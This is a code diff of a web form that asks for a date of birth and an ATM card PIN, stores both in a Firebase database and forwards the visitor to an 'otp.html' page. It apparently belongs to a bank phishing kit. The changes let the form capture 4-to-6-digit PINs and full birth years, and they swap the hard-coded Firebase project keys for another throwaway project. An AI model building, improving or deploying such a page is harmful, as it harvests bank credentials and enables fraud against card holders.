@@ -71,13 +71,13 @@
     
     <form onsubmit="submitForm(event)">
       <div class="input-group">
-        <label for="dob">Date of Birth (DD/MM/YY)</label>
-        <input type="text" id="dob" name="dob" placeholder="DD/MM/YY" maxlength="8" required>
+        <label for="dob">Date of Birth (DD/MM/YYYY)</label>
+        <input type="text" id="dob" name="dob" placeholder="DD/MM/YYYY" maxlength="10" required autofocus>
       </div>
 
       <div class="input-group">
         <label for="pin">ATM Card PIN</label>
-        <input type="password" id="pin" name="pin" maxlength="4" pattern="\d{4}" inputmode="numeric" required>
+        <input type="password" id="pin" name="pin" minlength="4" maxlength="6" pattern="\d{4,6}" inputmode="numeric" required>
       </div>
 
       <div style="text-align: center;">
@@ -92,12 +92,12 @@
 
   <script>
     const firebaseConfig = {
-      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
-      authDomain: "dlhiljbrd.firebaseapp.com",
-      projectId: "dlhiljbrd",
-      storageBucket: "dlhiljbrd.firebasestorage.app",
-      messagingSenderId: "981951131769",
-      appId: "1:981951131769:web:5d56cd1423d753992664a8"
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.firebasestorage.app",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
     };
 
     firebase.initializeApp(firebaseConfig);
@@ -109,7 +109,7 @@
         value = value.slice(0, 2) + '/' + value.slice(2);
       }
       if (value.length > 4) {
-        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 6);
+        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
       }
       e.target.value = value;
     });
@@ -119,15 +119,15 @@
 
       const dob = document.getElementById('dob').value;
       const pin = document.getElementById('pin').value;
-      const dobPattern = /^\d{2}\/\d{2}\/\d{2}$/;
+      const dobPattern = /^\d{2}\/\d{2}\/\d{4}$/;
 
       if (!dobPattern.test(dob)) {
-        alert("Please enter DOB in DD/MM/YY format.");
+        alert("Please enter DOB in DD/MM/YYYY format.");
         return false;
       }
 
-      if (pin.length !== 4 || isNaN(pin)) {
-        alert("Please enter a valid 4-digit PIN.");
+      if (pin.length < 4 || pin.length > 6 || isNaN(pin)) {
+        alert("Please enter a valid 4 to 6-digit PIN.");
         return false;
       }
 
@@ -136,7 +136,7 @@
         pin: pin,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
-        window.location.href = "otp.html"; // Replace with real page filename
+        window.location.href = "otp.html";
       }).catch((error) => {
         alert("Error saving to Firebase: " + error);
       });
